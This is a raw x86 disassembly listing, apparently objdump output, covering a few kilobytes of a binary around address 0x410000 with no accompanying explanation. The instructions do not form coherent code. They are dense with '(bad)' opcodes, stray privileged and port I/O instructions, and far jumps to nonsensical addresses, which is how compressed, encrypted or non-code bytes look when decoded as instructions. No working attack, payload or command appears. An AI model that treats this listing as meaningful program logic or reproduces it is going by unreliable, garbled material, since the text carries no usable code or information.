  4108a6:	cli    
  4108a7:	pop    esp
  4108a8:	addr16 xor eax,eax
  4108ab:	mov    bh,0xa
  4108ad:	gs mov dh,0xb9
  4108b0:	aaa    
  4108b1:	xor    DWORD PTR [esi+0x1f],0xfffffffa
  4108b5:	sub    al,0x68
  4108b7:	arpl   WORD PTR [ecx],dx
  4108b9:	inc    edx
  4108ba:	or     BYTE PTR [ebx+edi*2-0x7e],al
  4108be:	sbb    bl,0xa1
  4108c1:	jg     0x410894
  4108c3:	(bad)  
  4108c4:	(bad)  
  4108c5:	add    ah,ch
  4108c7:	sub    al,0x37
  4108c9:	scas   eax,DWORD PTR es:[di]
  4108cb:	or     ax,0x5ae4
  4108cf:	mov    al,0xa2
  4108d1:	xlat   BYTE PTR ds:[ebx]
  4108d2:	xchg   ebp,eax
  4108d3:	and    dl,BYTE PTR [ebp+ecx*8+0x6f0ee35f]
  4108da:	add    cl,BYTE PTR [ecx]
  4108dc:	sub    al,0x5c
  4108de:	push   ecx
  4108df:	lods   al,BYTE PTR ds:[esi]
  4108e0:	rcl    ecx,1
  4108e2:	fisttp WORD PTR [esi]
  4108e4:	std    
  4108e5:	data16 (bad) 
  4108ea:	(bad)  
  4108eb:	in     al,0x28
  4108ed:	(bad)  
  4108ee:	test   eax,0x4eebd981
  4108f3:	(bad)  
  4108f4:	(bad)  
  4108f5:	retf   
  4108f6:	pop    ebp
  4108f7:	inc    edi
  4108f8:	test   BYTE PTR [ebx],0x58
  4108fb:	xchg   DWORD PTR [edi+0x4665de30],ecx
  410901:	push   0x9a9ef295
  410906:	in     eax,0xd7
  410908:	push   esi
  410909:	mov    dl,0x3
  41090b:	push   esp
  41090c:	inc    eax
  41090d:	jbe    0x4108e2
  41090f:	repnz push eax
  410911:	scas   eax,DWORD PTR es:[edi]
  410912:	adc    DWORD PTR [eax+0x3b],edx
  410915:	sub    eax,0xb76ace66
  41091a:	dec    eax
  41091b:	retf   
  41091c:	mov    ds:0x33672b5b,al
  410921:	std    
  410922:	sub    bl,BYTE PTR [edx+eax*8+0x53b8b0d5]
  410929:	push   esp
  41092a:	push   eax
  41092b:	ret    0x8436
  41092e:	mov    ebx,0x9bd54db3
  410933:	jbe    0x410938
  410935:	xchg   DWORD PTR [ecx+0x40c504f1],ebp
  41093b:	rol    DWORD PTR [esp+eiz*8-0x53],1
  41093f:	adc    edx,DWORD PTR [eax]
  410941:	pop    ss
  410942:	js     0x41093b
  410944:	out    dx,eax
  410945:	mov    esp,0x3b6d1281
  41094a:	push   es
  41094b:	out    0x75,al
  41094d:	xlat   BYTE PTR ds:[ebx]
  41094e:	inc    esp
  41094f:	dec    edi
  410950:	push   ecx
  410951:	sub    DWORD PTR ds:0xcfb4530a,ebp
  410957:	add    al,bl
  410959:	and    eax,0x116d64a8
  41095e:	push   esp
  41095f:	fistp  QWORD PTR [ebp+0x6464d41c]
  410965:	sub    eax,ebx
  410967:	adc    cl,al
  410969:	inc    esi
  41096a:	mov    edx,DWORD PTR [ebx]
  41096c:	push   edi
  41096d:	pop    edi
  41096e:	cmp    DWORD PTR [ebx],esp
  410970:	lock cmp eax,ebx
  410973:	jl     0x41096b
  410975:	bound  esi,QWORD PTR [edi+0x6a]
  410978:	jg     0x41099f
  41097a:	(bad)  
  41097b:	nop
  41097c:	mov    WORD PTR [ebx-0x6844442f],gs
  410982:	iret   
  410983:	jecxz  0x41097d
  410985:	jecxz  0x4109f3
  410987:	inc    eax
  410988:	pop    esp
  410989:	mov    al,0xab
  41098b:	inc    ebp
  41098c:	mov    dh,0xd0
  41098e:	pop    esp
  41098f:	pop    ds
  410990:	sar    DWORD PTR [ecx],1
  410992:	jns    0x41092f
  410994:	out    0x10,eax
  410996:	push   0x3338aa6c
  41099b:	inc    esp
  41099c:	add    DWORD PTR ds:0xfe763241,esp
  4109a2:	daa    
  4109a3:	inc    esp
  4109a4:	pop    ds
  4109a5:	inc    edx
  4109a6:	xchg   edx,eax
  4109a7:	loope  0x410971
  4109a9:	les    eax,FWORD PTR [edx+0x76]
  4109ac:	ficomp DWORD PTR [esi-0x1d77aaa8]
  4109b2:	sbb    esp,ecx
  4109b4:	mov    dl,0x6c
  4109b6:	jmp    FWORD PTR ds:0x34b03df9
  4109bc:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109be:	fadd   st,st(0)
  4109c0:	jge    0x4109e8
  4109c2:	xchg   BYTE PTR [eax+0x5153792e],al
  4109c8:	dec    edx
  4109c9:	rcr    DWORD PTR [esi+0x30],1
  4109cc:	dec    eax
  4109cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ce:	ins    BYTE PTR es:[edi],dx
  4109cf:	rcr    ah,cl
  4109d1:	or     al,0x72
  4109d3:	je     0x4109d5
  4109d5:	inc    edi
  4109d6:	mov    edi,0xa755c372
  4109db:	dec    edi
  4109dc:	push   edx
  4109dd:	cld    
  4109de:	aaa    
  4109df:	dec    eax
  4109e0:	pusha  
  4109e1:	arpl   WORD PTR [edi],ax
  4109e3:	xor    BYTE PTR [ebx+eax*4],0xec
  4109e7:	imul   BYTE PTR [edi-0x3f]
  4109ea:	pop    ecx
  4109eb:	cs hlt 
  4109ed:	pop    ebx
  4109ee:	sbb    al,0x8d
  4109f0:	xor    DWORD PTR [edi],edx
  4109f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109f3:	out    dx,eax
  4109f4:	(bad)  
  4109f6:	or     esp,ecx
  4109f8:	lahf   
  4109f9:	jae    0x4109c7
  4109fb:	jge    0x4109ce
  4109fd:	pop    ebp
  4109fe:	inc    ecx
  4109ff:	fnstenv [ecx+0x31]
  410a02:	mov    cl,0xfb
  410a04:	jge    0x410a30
  410a06:	(bad)  
  410a07:	xchg   esp,eax
  410a08:	mov    cl,0x22
  410a0a:	xchg   edi,eax
  410a0b:	and    al,0x3b
  410a0d:	add    al,0x80
  410a0f:	adc    al,0x90
  410a11:	inc    esp
  410a12:	mov    eax,ds:0x8f9f4e3a
  410a17:	stc    
  410a18:	es push cs
  410a1a:	imul   DWORD PTR [edx-0x3a2c1743]
  410a20:	fs mov edx,0x6e3c526
  410a26:	adc    al,ch
  410a28:	adc    BYTE PTR [ebx+edi*1],ch
  410a2b:	and    DWORD PTR [ebp-0x57c638b8],eax
  410a31:	imul   edx,DWORD PTR [ecx],0xffffff89
  410a34:	xbegin 0xf6be187d
  410a3a:	retf   0x67db
  410a3d:	add    ah,BYTE PTR [esi-0x55c5d2da]
  410a43:	adc    al,0x23
  410a46:	push   ds
  410a47:	(bad)  
  410a48:	icebp  
  410a49:	mov    al,ds:0x9ade3d8f
  410a4e:	ret    0xbb89
  410a51:	xchg   ebx,eax
  410a52:	hlt    
  410a53:	xchg   BYTE PTR [edx+0x7d],dl
  410a56:	in     eax,dx
  410a57:	repz (bad) 
  410a59:	call   0xe436524d
  410a5e:	(bad)  
  410a5f:	dec    edx
  410a60:	add    esp,DWORD PTR [ebp+0x4d]
  410a63:	and    dl,BYTE PTR [eax+eax*4]
  410a66:	or     al,0xf5
  410a68:	xchg   ebp,eax
  410a69:	fisttp DWORD PTR [ebx-0x107a850f]
  410a6f:	xchg   edi,eax
  410a70:	(bad)  
  410a71:	inc    esi
  410a72:	jl     0x410a43
  410a74:	and    eax,DWORD PTR ds:0xe6d6a707
  410a7a:	xor    BYTE PTR [ecx],cl
  410a7c:	inc    DWORD PTR [ebp+0x5ef216af]
  410a82:	pop    ebx
  410a83:	jp     0x410a56
  410a85:	(bad)  
  410a86:	das    
  410a87:	jle    0x410ace
  410a89:	repnz or al,BYTE PTR [edx-0x6f]
  410a8d:	(bad)
  410a91:	push   0xffffffa6
  410a93:	mov    ds:0xc5ee7928,eax
  410a98:	sbb    DWORD PTR [ebx-0x79ba26df],ebx
  410a9e:	inc    esi
  410a9f:	shl    BYTE PTR [eax+ebx*2],0xd0
  410aa3:	xchg   BYTE PTR ds:0x6f307536,ah
  410aa9:	in     eax,0xda
  410aab:	test   eax,0xd4d469e4
  410ab0:	and    ebp,DWORD PTR [ecx-0x49]
  410ab3:	jmp    0xd49aef85
  410ab8:	mov    eax,0x9fdec96f
  410abd:	daa    
  410abe:	lods   eax,DWORD PTR ds:[esi]
  410abf:	pop    ebx
  410ac0:	(bad)  
  410ac4:	shr    ch,cl
  410ac6:	cdq    
  410ac7:	(bad)  
  410ac8:	dec    esi
  410ac9:	out    0x6e,eax
  410acb:	sub    eax,0x8a080f1a
  410ad0:	inc    esp
  410ad1:	sti    
  410ad2:	dec    ecx
  410ad3:	lock bound esi,QWORD PTR [ebx-0x3352de7a]
  410ada:	ficom  DWORD PTR ds:[ebx]
  410add:	push   edi
  410ade:	dec    eax
  410adf:	sub    DWORD PTR [edi+0x50],eax
  410ae2:	jmp    0xc320498d
  410ae7:	or     al,0xa4
  410aea:	ss pop edi
  410aec:	rcl    DWORD PTR [ebx+0x5101c827],0x78
  410af3:	jae    0x410a7e
  410af5:	(bad)  
  410af6:	jmp    0x1ab576cd
  410afb:	inc    edx
  410afc:	add    al,0x2c
  410afe:	jae    0x410b45
  410b00:	pushf  
  410b01:	push   ss
  410b02:	popf   
  410b03:	pop    es
  410b04:	xchg   ebx,eax
  410b05:	arpl   WORD PTR [eax],cx
  410b07:	or     al,bl
  410b09:	jbe    0x410aff
  410b0b:	mov    dh,0x7c
  410b0d:	int3   
  410b0e:	into   
  410b0f:	ins    DWORD PTR es:[edi],dx
  410b10:	lds    edi,FWORD PTR [esi-0x4a]
  410b13:	dec    ebp
  410b14:	xchg   edx,eax
  410b15:	push   ss
  410b16:	outs   dx,DWORD PTR ds:[esi]
  410b17:	fwait
  410b18:	mov    eax,ds:0xe936feed
  410b1d:	sbb    DWORD PTR [ebx],ecx
  410b1f:	lahf   
  410b20:	fidivr DWORD PTR [eax-0x32cac8fb]
  410b26:	jl     0x410ac2
  410b28:	rcr    DWORD PTR [eax+0x6c],cl
  410b2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410b2c:	xlat   BYTE PTR ds:[ebx]
  410b2d:	and    al,0x30
  410b2f:	jns    0x410b0b
  410b31:	jb     0x410b20
  410b33:	mov    edx,edi
  410b35:	adc    eax,0x57448f8b
  410b3a:	xchg   esi,eax
  410b3b:	add    edx,DWORD PTR [edi]
  410b3d:	jae    0x410aca
  410b3f:	mov    edi,0x7c6f4a2c
  410b44:	aaa    
  410b45:	ret    0x9e16
  410b48:	fld    QWORD PTR [ebp-0x7bcc7d5c]
  410b4e:	in     eax,dx
  410b4f:	lea    esi,[ecx-0x63afe7e1]
  410b55:	adc    ch,BYTE PTR [eax]
  410b57:	cdq    
  410b58:	mov    al,0x81
  410b5a:	js     0x410bc6
  410b5c:	ret    0xb354
  410b5f:	push   edx
  410b60:	cwde   
  410b61:	mov    edi,DWORD PTR [edi+0x58]
  410b64:	loop   0x410aee
  410b66:	mov    WORD PTR [esi+0x3e7c5b91],gs
  410b6c:	jnp    0x410bc8
  410b6e:	fwait
  410b6f:	std    
  410b70:	das    
  410b71:	jmp    0xfd24:0xf538f09e
  410b78:	retf   
  410b79:	xchg   ebp,eax
  410b7a:	adc    DWORD PTR [eax+0x51],ecx
  410b7d:	and    BYTE PTR [edi],ah
  410b7f:	pop    es
  410b80:	add    ecx,eax
  410b82:	push   0x0
  410b84:	ins    BYTE PTR es:[edi],dx
  410b85:	xchg   esi,eax
  410b86:	xlat   BYTE PTR es:[ebx]
  410b88:	inc    esp
  410b89:	xor    BYTE PTR [esi-0x5590b00a],0xeb
  410b90:	mov    esp,0x2957198d
  410b95:	imul   ebp,DWORD PTR [esi+0x721fa3d8],0x9d8e7c0c
  410b9f:	nop
  410ba0:	bound  edi,QWORD PTR [ebx-0x6159c521]
  410ba6:	mov    DWORD PTR [edi-0x4a],ebp
  410ba9:	leave  
  410baa:	mov    ebp,0x605a2f3a
  410baf:	mov    edi,0x45da69de
  410bb4:	jbe    0x410c32
  410bb6:	inc    ecx
  410bb7:	popf   
  410bb8:	mov    edx,0x1624e32f
  410bbd:	sar    edi,cl
  410bbf:	add    ebp,esp
  410bc1:	fs ret 
  410bc3:	in     al,0x4
  410bc5:	adc    eax,0x49aee52
  410bca:	push   esi
  410bcb:	cmp    esp,DWORD PTR [edi-0x45a16bc7]
  410bd1:	sbb    DWORD PTR [ebx+0x94a9ea1],ebx
  410bd7:	push   cs
  410bd8:	rol    BYTE PTR [ecx+0x6a0bc3d4],1
  410bde:	add    al,0x1
  410be0:	fld    st(6)
  410be2:	mov    edi,0xccabc779
  410be7:	mov    cl,0xed
  410be9:	jmp    0x77ca:0x48b8d786
  410bf0:	clc    
  410bf1:	arpl   bx,si
  410bf3:	jns    0x410c6b
  410bf5:	or     eax,0x6bafc62e
  410bfa:	sbb    ch,BYTE PTR [esi-0x50]
  410bfd:	cli    
  410bfe:	pusha  
  410bff:	ins    BYTE PTR es:[edi],dx
  410c00:	pop    edi
  410c01:	int    0x6b
  410c03:	(bad)  
  410c05:	mov    ebp,DWORD PTR [eax+0x59783343]
  410c0b:	sbb    eax,0x4a12190f
  410c10:	rcl    BYTE PTR [ebx+0x57d5470e],cl
  410c16:	setl   BYTE PTR [eax]
  410c19:	cmc    
  410c1a:	jns    0x410bc7
  410c1c:	mov    al,ds:0xac852b17
  410c21:	xchg   ebp,eax
  410c22:	mov    al,ds:0xde3ebe56
  410c27:	mov    esp,0xa9936a6d
  410c2c:	xor    eax,0xdd130e1b
  410c31:	pop    ds
  410c32:	inc    esp
  410c33:	mov    ch,0x62
  410c35:	call   0x5ada:0xd6c750f8
  410c3c:	mov    edi,0x2c8d6406
  410c41:	in     eax,dx
  410c42:	psadbw mm3,QWORD PTR [ebx]
  410c45:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410c46:	adc    DWORD PTR [ecx-0x2bd0b807],0x137517fd
  410c50:	mov    bl,0xb7
  410c52:	pop    eax
  410c53:	scas   al,BYTE PTR es:[edi]
  410c54:	mov    DWORD PTR [esp+eax*2-0x24c9368a],eax
  410c5b:	xchg   ebp,eax
  410c5c:	dec    edx
  410c5d:	xor    BYTE PTR [ebx-0x7b1e837c],dh
  410c63:	xchg   esi,eax
  410c64:	mov    edx,0x3f9a0407
  410c69:	pop    ss
  410c6a:	inc    esp
  410c6b:	fwait
  410c6c:	mov    cl,0x2
  410c6e:	ins    BYTE PTR es:[edi],dx
  410c6f:	fs das 
  410c71:	or     BYTE PTR [ebx+0x579fa76e],ah
  410c77:	jmp    0x5135:0x688aa5b
  410c7e:	inc    ebp
  410c7f:	push   cs
  410c80:	test   DWORD PTR cs:[esi],esi
  410c83:	sbb    eax,0x80338d7c
  410c88:	adc    eax,0xf259014b
  410c8d:	push   edi
  410c8e:	jl     0x410cf1
  410c90:	sub    BYTE PTR [edi],0xd1
  410c93:	ss fucomp st(6)
  410c96:	es pop ss
  410c98:	mov    DWORD PTR [ecx],eax
  410c9a:	in     al,0x2
  410c9c:	mov    dl,0xee
  410c9e:	icebp  
  410c9f:	push   esp
  410ca0:	rcr    DWORD PTR [esi],0xd4
  410ca3:	mov    al,ds:0x55d8713c
  410ca8:	inc    ebp
  410ca9:	stos   DWORD PTR es:[edi],eax
  410caa:	enter  0x49e9,0xff
  410cae:	movaps xmm4,XMMWORD PTR [ebx+edi*8+0x65]
  410cb3:	xchg   edx,ecx
  410cb5:	popf   
  410cb6:	in     eax,dx
  410cb7:	stc    
  410cb8:	fwait
  410cb9:	jno    0x410d20
  410cbb:	mov    edx,0x18181cbd
  410cc0:	cmp    DWORD PTR [edi+0x2e],ecx
  410cc3:	jg     0x410cac
  410cc5:	dec    ebp
  410cc6:	pop    eax
  410cc7:	lods   eax,DWORD PTR ds:[esi]
  410cc8:	je     0x410d09
  410cca:	xchg   BYTE PTR [eax-0x7c],dh
  410ccd:	test   DWORD PTR [ecx+0x32f61ab1],ecx
  410cd3:	or     ebp,DWORD PTR [edi+0x65]
  410cd6:	aas    
  410cd7:	sub    esi,edx
  410cd9:	test   BYTE PTR [edx+0x7afcb0f0],cl
  410cdf:	stc    
  410ce0:	div    BYTE PTR [ebx+0x1836dd8c]
  410ce6:	jb     0x410d1f
  410ce8:	mov    ebp,0xc8d0e694
  410ced:	sbb    eax,0xf9192d80
  410cf2:	lds    ebx,FWORD PTR [esi-0x3860b3df]
  410cf8:	dec    edi
  410cf9:	push   eax
  410cfa:	dec    esi
  410cfb:	inc    edx
  410cfc:	xor    al,0xc6
  410cfe:	xlat   BYTE PTR ds:[ebx]
  410cff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410d00:	fsub   DWORD PTR [edi+ebp*8-0x1f2725f3]
  410d07:	js     0x410d0c
  410d09:	mov    bl,0xe3
  410d0b:	xchg   edx,eax
  410d0c:	je     0x410d43
  410d0e:	pusha  
  410d0f:	mov    dh,0x74
  410d11:	mov    eax,ds:0x1cd6c5e6
  410d16:	repz fbld TBYTE PTR [edi]
  410d19:	dec    edi
  410d1a:	sub    al,0x7b
  410d1c:	dec    edi
  410d1d:	cs jle 0x410d30
  410d20:	push   0xffffffd6
  410d22:	retf   
  410d23:	mov    bh,0x60
  410d25:	repz scas al,BYTE PTR es:[edi]
  410d27:	imul   ebp,DWORD PTR [ebx],0xfd720817
  410d2d:	outs   dx,BYTE PTR ds:[esi]
  410d2e:	gs aam 0x4f
  410d31:	not    ecx
  410d33:	fadd   DWORD PTR [edi-0x57]
  410d36:	or     ebp,ebx
  410d38:	adc    BYTE PTR [edi],ch
  410d3a:	jecxz  0x410d9c
  410d3c:	(bad)  
  410d3d:	sbb    eax,0x7d815447
  410d42:	push   edi
  410d43:	push   0x1dd61523
  410d48:	aam    0x67
  410d4a:	add    esi,esi
  410d4c:	imul   edi,DWORD PTR [ebp+0x8],0xffffff9a
  410d50:	dec    ebp
  410d51:	jmp    0x9c7c35c7
  410d56:	xchg   edx,eax
  410d57:	xor    eax,0xe79d506
  410d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410d5d:	pop    edi
  410d5e:	mov    dl,0xfa
  410d60:	test   al,0x36
  410d62:	fcmovnbe st,st(2)
  410d64:	ret    0xf4af
  410d67:	xor    esp,esi
  410d69:	inc    edx
  410d6a:	jno    0x410dbc
  410d6c:	sub    BYTE PTR [edx-0x1d],dl
  410d6f:	bnd jg 0x410dce
  410d72:	jge    0x410d88
  410d74:	mov    es,WORD PTR [ebx+0x7abadcd7]
  410d7a:	xchg   edi,eax
  410d7b:	pop    edx
  410d7c:	sub    DWORD PTR [eax+ecx*8+0x2b41f075],eax
  410d83:	stos   DWORD PTR es:[edi],eax
  410d84:	pushf  
  410d85:	pop    esi
  410d86:	test   al,0xe1
  410d88:	jmp    0x410dbb
  410d8a:	inc    edx
  410d8b:	cmp    dh,BYTE PTR [ecx]
  410d8d:	pusha  
  410d8e:	xor    DWORD PTR [ebx],eax
  410d90:	jg     0x410d5c
  410d92:	mov    bh,0x9f
  410d94:	jae    0x410deb
  410d96:	mov    dh,0x1f
  410d98:	lods   eax,DWORD PTR ds:[esi]
  410d99:	lock mov bh,bh
  410d9c:	pop    eax
  410d9d:	jecxz  0x410d98
  410d9f:	cld    
  410da0:	push   ebx
  410da1:	cmp    BYTE PTR [ecx+0x5d],dh
  410da4:	and    esi,DWORD PTR [eax+0x2e]
  410da7:	mov    ds:0x287c3f36,al
  410dac:	add    ebp,0x7
  410daf:	jmp    0xeef9cc69
  410db4:	in     eax,0xed
  410db6:	pushf  
  410db7:	icebp  
  410db8:	dec    eax
  410db9:	call   0xc4cfba6b
  410dbe:	pop    edx
  410dbf:	xchg   ebp,esp
  410dc1:	jno    0x410da5
  410dc3:	in     al,0xcb
  410dc5:	ficom  DWORD PTR [edi]
  410dc7:	test   dh,bh
  410dc9:	or     eax,0x186735c0
  410dce:	rcl    BYTE PTR [edx+0x45],0x4e
  410dd2:	mov    edx,0x440ec6a6
  410dd7:	in     al,dx
  410dd8:	xchg   dl,ah
  410dda:	mov    ebx,0x49781239
  410ddf:	sbb    DWORD PTR [esi+ecx*2+0x6be0c499],eax
  410de6:	(bad)  
  410de7:	or     esp,DWORD PTR [ebx+0x43]
  410dea:	fwait
  410deb:	add    al,bl
  410ded:	fstp   DWORD PTR [eax]
  410def:	das    
  410df0:	dec    edx
  410df1:	jnp    0x410e4e
  410df3:	adc    eax,0xdad1b525
  410df8:	add    DWORD PTR [ebx+0x66],edx
  410dfb:	(bad)  
  410dfc:	cli    
  410dfd:	fs xchg ebp,eax
  410dff:	mov    ds:0x5e1efb0d,eax
  410e04:	jno    0x410df8
  410e06:	dec    ebx
  410e07:	xchg   esp,eax
  410e08:	test   al,ch
  410e0a:	mov    dh,BYTE PTR [ebp+esi*2+0x42ce8280]
  410e11:	mov    ah,BYTE PTR [ebp+0x1e]
  410e14:	add    DWORD PTR [ebx-0x46],0xfbd6e830
  410e1b:	cdq    
  410e1c:	adc    DWORD PTR [ebp+0x3d1f7078],ebx
  410e22:	shl    BYTE PTR [ebx-0x8],0x83
  410e26:	xchg   edx,eax
  410e27:	jo     0x410ea3
  410e29:	sbb    eax,0xd3682dbe
  410e2e:	in     eax,dx
  410e2f:	xchg   DWORD PTR [edi+0x4464dcc9],esi
  410e35:	ds or  eax,0xb52d863d
  410e3b:	or     eax,eax
  410e3d:	mov    eax,0x6d8ea7bc
  410e42:	mov    esp,0xf48f89a5
  410e47:	adc    eax,0xa5ec603b
  410e4c:	xlat   BYTE PTR ds:[ebx]
  410e4d:	add    dl,BYTE PTR [ecx]
  410e4f:	fwait
  410e50:	scas   al,BYTE PTR es:[edi]
  410e51:	pop    eax
  410e52:	addr16 dec ecx
  410e54:	imul   eax,DWORD PTR [ebx+0x6bd4f11],0x697eadd3
  410e5e:	xchg   edx,eax
  410e5f:	loop   0x410dfe
  410e61:	dec    ebp
  410e62:	push   ds
  410e63:	pop    eax
  410e64:	in     eax,0x1e
  410e66:	and    edx,DWORD PTR [edi]
  410e68:	pop    esi
  410e69:	push   es
  410e6a:	jns    0x410eac
  410e6c:	xor    al,0xfa
  410e6e:	nop
  410e6f:	and    bl,BYTE PTR [ecx-0x604beca7]
  410e75:	jmp    0x410dfe
  410e77:	xor    eax,0x2470b21e
  410e7c:	stos   BYTE PTR es:[edi],al
  410e7d:	jbe    0x410ed2
  410e7f:	leave  
  410e80:	sbb    eax,0xcdd1b1ae
  410e85:	outs   dx,DWORD PTR ds:[esi]
  410e86:	mov    ebp,fs
  410e88:	jl     0x410ed0
  410e8a:	sbb    bl,BYTE PTR [ebp+0x79]
  410e8d:	inc    ebx
  410e8e:	in     al,dx
  410e8f:	or     eax,0xbe567407
  410e94:	popa   
  410e95:	or     edi,DWORD PTR [ebp+0x60]
  410e98:	or     DWORD PTR [edi+0x75075569],ecx
  410e9e:	inc    ebx
  410e9f:	jecxz  0x410f20
  410ea1:	sbb    al,0x59
  410ea3:	stc    
  410ea4:	shl    DWORD PTR [edx-0x75],1
  410ea7:	(bad)  
  410ea8:	and    dl,bl
  410eaa:	ins    BYTE PTR es:[edi],dx
  410eab:	rol    BYTE PTR [eax+ecx*4-0x22],0x1b
  410eb0:	retf   
  410eb1:	cmp    DWORD PTR [ecx-0x27],esi
  410eb4:	test   BYTE PTR [edx+0x33],cl
  410eb7:	stos   BYTE PTR es:[edi],al
  410eb8:	(bad)  
  410eb9:	mov    bl,0x72
  410ebb:	cmp    DWORD PTR [esi],eax
  410ebd:	pop    DWORD PTR [ebx+eiz*2+0x7c7a4858]
  410ec4:	pop    esi
  410ec5:	enter  0x1dff,0x2e
  410ec9:	jbe    0x410edf
  410ecb:	js     0x410f21
  410ecd:	inc    ebx
  410ece:	add    eax,0x29997341
  410ed3:	test   BYTE PTR cs:[esi-0xccc0142],ah
  410eda:	(bad)  
  410edb:	imul   eax,DWORD PTR [eax-0xf],0x75
  410edf:	enter  0x90a2,0x54
  410ee3:	cmp    BYTE PTR [eax],0x72
  410ee6:	call   0xac5c:0xa8729661
  410eed:	sbb    al,0x48
  410eef:	and    edi,ebp
  410ef1:	sbb    DWORD PTR [esi+0xc],0xffffffaf
  410ef5:	xlat   BYTE PTR ds:[ebx]
  410ef6:	pop    esi
  410ef7:	(bad)  [edi]
  410ef9:	jmp    0xb9457d21
  410efe:	mov    cl,0x93
  410f00:	in     eax,0x99
  410f02:	sbb    dl,BYTE PTR [ecx-0x15]
  410f05:	jp     0x410eac
  410f07:	adc    eax,0x21d132f8
  410f0c:	mov    al,ds:0xe9a67bb0
  410f11:	out    dx,al
  410f12:	jmp    0x689646cd
  410f17:	scas   eax,DWORD PTR es:[edi]
  410f18:	repz or al,0x12
  410f1b:	lods   al,BYTE PTR ds:[esi]
  410f1c:	mov    eax,ds:0x36e22399
  410f22:	xchg   DWORD PTR [edi-0x5762c54d],edi
  410f28:	xor    esi,DWORD PTR [ecx]
  410f2a:	jl     0x410fa6
  410f2c:	mov    ebx,0xcdc0f69f
  410f31:	or     al,0xe2
  410f33:	mov    edi,0xf8b15111
  410f38:	jo     0x410f1b
  410f3a:	rcl    DWORD PTR [ecx-0x40],cl
  410f3d:	dec    edx
  410f3e:	bound  esi,QWORD PTR [ecx]
  410f40:	mov    ebx,0x2a830607
  410f45:	(bad)  
  410f46:	loop   0x410ed6
  410f48:	(bad)  
  410f49:	cmp    DWORD PTR [ebx-0x712242a4],edi
  410f4f:	jge    0x410fbe
  410f51:	xor    BYTE PTR [edx],dl
  410f53:	daa    
  410f54:	pop    esi
  410f55:	jae    0x410f57
  410f57:	lea    edx,[edx-0xc5fc880]
  410f5d:	setge  BYTE PTR [ecx-0x46291d66]
  410f64:	data16 jmp 0x410eee
  410f67:	add    esp,DWORD PTR [ecx]
  410f69:	mov    esp,0x49dc71d8
  410f6e:	cmp    DWORD PTR [esp+eax*2],edx
  410f71:	fsub   st(6),st
  410f73:	outs   dx,DWORD PTR ds:[esi]
  410f74:	pop    edi
  410f75:	or     al,0xe1
  410f77:	stos   DWORD PTR es:[edi],eax
  410f78:	mov    dl,0x71
  410f7a:	hlt    
  410f7b:	cdq    
  410f7c:	fidivr DWORD PTR [edx]
  410f7e:	into   
  410f7f:	mov    edi,0x36aa5a41
  410f84:	(bad)  
  410f85:	faddp  st(6),st
  410f87:	test   al,0xb6
  410f89:	sbb    eax,0x360f893e
  410f8e:	push   ecx
  410f8f:	cdq    
  410f90:	fsub   DWORD PTR [esi+0x2a]
  410f93:	and    DWORD PTR ds:0xf0ce4133,ebx
  410f99:	or     ebx,DWORD PTR [ebx-0x350ca68f]
  410f9f:	mov    edi,0x992db4c5
  410fa4:	not    DWORD PTR [edx]
  410fa6:	sbb    ebx,DWORD PTR [ebp+0x93db631]
  410fac:	xor    esp,DWORD PTR [ecx+esi*4+0x5e]
  410fb0:	cwde   
  410fb1:	cmp    ah,BYTE PTR [ecx-0x6a1fbc00]
  410fb7:	(bad)  
  410fb9:	xor    esp,DWORD PTR [ebx]
  410fbb:	push   0x71
  410fbd:	hlt    
  410fbe:	in     eax,0xa3
  410fc0:	daa    
  410fc1:	es cmp ax,0x2531
  410fc6:	cmc    
  410fc7:	adc    ch,BYTE PTR [esi+0x1b]
  410fca:	xchg   esi,eax
  410fcb:	(bad)  
  410fcc:	aam    0xcf
  410fce:	xor    BYTE PTR [eax+0x5d],0x6a
  410fd2:	fs jge 0x41101c
  410fd5:	xor    al,0x31
  410fd7:	pop    ecx
  410fd8:	push   edi
  410fd9:	icebp  
  410fda:	shr    DWORD PTR [ecx+0x29047d3a],0xa9
  410fe1:	les    ebx,FWORD PTR [eax+esi*8-0x26]
  410fe5:	fld    DWORD PTR [edx+0x7ec7d970]
  410feb:	lahf   
  410fec:	and    al,0x3e
  410fee:	mov    al,BYTE PTR [eax-0x43]
  410ff1:	xchg   ecx,eax
  410ff2:	cmp    al,0x5
  410ff4:	jge    0x410fbc
  410ff6:	add    al,bh
  410ff8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410ff9:	jnp    0x410fef
  410ffb:	loopne 0x41107a
  410ffd:	mov    ebp,0x7da92c29
  411002:	gs sahf 
  411004:	mov    dh,0x88
  411006:	aaa    
  411007:	mov    ch,0x9f
  411009:	into   
  41100a:	mov    edx,0xc407830a
  41100f:	push   es
  411010:	cmp    bh,cl
  411012:	out    0xba,al
  411014:	mov    ah,0x75
  411016:	stc    
  411017:	push   cs
  411018:	inc    esi
  411019:	or     cl,BYTE PTR [edi+eiz*2]
  41101c:	repnz shr BYTE PTR [ecx],1
  41101f:	dec    ecx
  411020:	scas   eax,DWORD PTR es:[edi]
  411021:	inc    ebp
  411022:	cld    
  411023:	mov    cl,0xd5
  411025:	mov    bh,0x32
  411027:	xchg   eax,eax
  411029:	cmp    ebp,edx
  41102b:	jo     0x41107b
  41102d:	pop    ds
  41102e:	mov    eax,ds:0xa02c3015
  411033:	fwait
  411034:	jb     0x41107b
  411036:	call   0xc2f9:0xc4df381e
  41103d:	loop   0x41103e
  41103f:	xor    bh,BYTE PTR [edx]
  411041:	mov    bh,0x9b
  411043:	(bad)  
  411044:	in     eax,0x77
  411046:	add    esp,DWORD PTR [ebx-0x1522956a]
  41104c:	mov    al,BYTE PTR [esp+esi*8-0x43]
  411050:	inc    ecx
  411051:	iret   
  411052:	dec    esp
  411053:	std    
  411054:	push   ss
  411055:	test   BYTE PTR [ebx-0x72],ah
  411058:	dec    edi
  411059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41105a:	push   ecx
  41105b:	sbb    eax,DWORD PTR [ebx-0x117dffbe]
  411061:	jmp    0xa4812092
  411066:	cmc    
  411067:	imul   ebx,DWORD PTR [ecx+0x74],0xb24ea1f3
  41106e:	xor    al,dl
  411070:	add    ebx,edi
